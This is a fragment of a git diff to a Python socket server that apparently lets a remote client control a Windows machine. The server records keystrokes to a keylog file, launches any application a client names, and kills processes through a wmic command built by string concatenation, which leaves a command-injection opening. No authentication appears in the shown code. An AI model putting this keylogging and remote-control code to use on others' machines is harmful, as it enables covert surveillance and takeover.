@@ -28,21 +28,22 @@ FLAG_APPS_END = 'APPS_END'
 # BUFFER
 BUFFER_SIZE = 1024
 
-# TMP
+# PATH
 TMP_PATH = os.path.join(os.getcwd(), 'tmp')
 
 #LOGGING
-logging.basicConfig(filename = (os.path.join(TMP_PATH, "keylog.txt")), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+logging.basicConfig(filename=(os.path.join(TMP_PATH, "keylog.txt")), level=logging.INFO, format='%(asctime)s: %(message)s', encoding='utf-8' )
 
 
 class Server:
   def __init__(self):
-    self.host = socket.gethostbyname_ex(socket.gethostname())[2][2]
+    self.host = socket.gethostbyname(socket.gethostname())
     self.port = 5000
     self.addr = (self.host, self.port)
     self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     self.server.bind(self.addr)
     self.keylogger_listener = None
+    
 
   def run(self):
     self.server.listen(5)
@@ -142,8 +143,17 @@ class Server:
         elif data == CMD_START_APP.encode():
           print(f'[APP] {addr} requested start app.')
           app_name = conn.recv(BUFFER_SIZE).decode()
-          self.start_app(str(app_name))
-          print(f'[APP] {addr} started app.')
+          try:
+            self.start_app(str(app_name))
+            print(f'[APP] {addr} started app.')
+            conn.send('App started successfully.'.encode())
+            time.sleep(0.01)
+            conn.send(FLAG_MSG_END.encode())
+          except Exception as e:
+            print(f'[APP] {addr} failed to start app: {e}')
+            conn.send('Failed to start app.'.encode())
+            time.sleep(0.01)
+            conn.send(FLAG_MSG_END.encode())
 
       conn.close()
       print(f"[DISCONNECTED] {addr} disconnected.")
@@ -182,14 +192,15 @@ class Server:
     os.popen('wmic process where processid=' + pid + ' call terminate')
 
   def on_press(self, key):
-    # with open(os.path.join(TMP_PATH, 'keylog.txt'), 'a') as f:
-    # # Special charactersa
+    # try:
+    #   if key == None:
+    #     key = '<!>'
     #   if key == keyboard.Key.enter:
-    #     key = '\n'
+    #     key = '<enter>'
     #   if key == keyboard.Key.space:
-    #     key = ' '
+    #     key = '<space>'
     #   if key == keyboard.Key.tab:
-    #     key = '\t'
+    #     key = '<tab>'
     #   if key == keyboard.Key.shift:
     #     key = '<shift>'
     #   if key == keyboard.Key.backspace:
@@ -198,10 +209,12 @@ class Server:
     #     key = '<esc>'
     #   if key == keyboard.Key.ctrl:
     #     key = '<ctrl>'
-
+    # except UnicodeEncodeError:
+    #   key = '<!>'
+    # with open(os.path.join(TMP_PATH, 'keylog.txt'), 'a') as f:
     #   key = str(key).replace("'", '')
+    #   f.write(key)
 
-    #   f.write(str(key))
     logging.info(str(key))
 
   def start_keylogger(self):
@@ -228,6 +241,7 @@ class Server:
 
   def start_app(self, app_name):
     os.startfile(app_name)
+
 
 if __name__ == '__main__':
     server = Server()
